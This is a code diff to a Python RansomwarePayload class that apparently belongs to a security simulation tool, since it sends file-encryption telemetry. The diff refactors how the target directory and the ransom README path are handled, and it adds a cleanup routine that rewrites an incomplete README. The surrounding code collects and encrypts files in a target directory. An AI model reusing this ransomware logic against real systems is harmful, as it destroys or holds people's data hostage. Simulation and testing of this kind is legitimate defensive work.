@@ -26,8 +26,14 @@ class RansomwarePayload:
         self._leave_readme = leave_readme
         self._telemetry_messenger = telemetry_messenger
 
+        self._target_directory = self._config.target_directory
+        self._readme_file_path = (
+            self._target_directory / README_FILE_NAME if self._target_directory else None
+        )
+        self._readme_incomplete = False
+
     def run_payload(self):
-        if not self._config.target_directory:
+        if not self._target_directory:
             return
 
         logger.info("Running ransomware payload")
@@ -37,14 +43,14 @@ class RansomwarePayload:
             self._encrypt_files(file_list)
 
         if self._config.readme_enabled:
-            self._leave_readme(README_SRC, self._config.target_directory / README_FILE_NAME)
+            self._leave_readme_in_target_directory()
 
     def _find_files(self) -> List[Path]:
-        logger.info(f"Collecting files in {self._config.target_directory}")
-        return sorted(self._select_files(self._config.target_directory))
+        logger.info(f"Collecting files in {self._target_directory}")
+        return sorted(self._select_files(self._target_directory))
 
     def _encrypt_files(self, file_list: List[Path]):
-        logger.info(f"Encrypting files in {self._config.target_directory}")
+        logger.info(f"Encrypting files in {self._target_directory}")
 
         for filepath in file_list:
             try:
@@ -58,3 +64,29 @@ class RansomwarePayload:
     def _send_telemetry(self, filepath: Path, success: bool, error: str):
         encryption_attempt = FileEncryptionTelem(str(filepath), success, error)
         self._telemetry_messenger.send_telemetry(encryption_attempt)
+
+    def _leave_readme_in_target_directory(self):
+        try:
+            self._readme_incomplete = True
+            self._leave_readme(README_SRC, self._readme_file_path)
+            self._readme_incomplete = False
+        except Exception as ex:
+            logger.warning(f"An error occurred while attempting to leave a README.txt file: {ex}")
+
+    def cleanup(self):
+        # This cleanup function is only concerned with cleaning up and replacing *incomplete*
+        # README.txt files; its goal is not to ensure the existence of a README file. Therefore,
+        # only retry if a README.txt file actually exists.
+        if self._readme_incomplete and self._readme_file_path.exists():
+            logger.info(
+                "The process of leaving a README.txt was interrupted. Removing the corrupt file "
+                "and trying again."
+            )
+            try:
+                self._readme_file_path.unlink()
+                self._leave_readme_in_target_directory()
+            except Exception as ex:
+                logger.error(
+                    "An error occurred while trying to remove the corrupt or incomplete README.txt "
+                    f"file: {ex}"
+                )
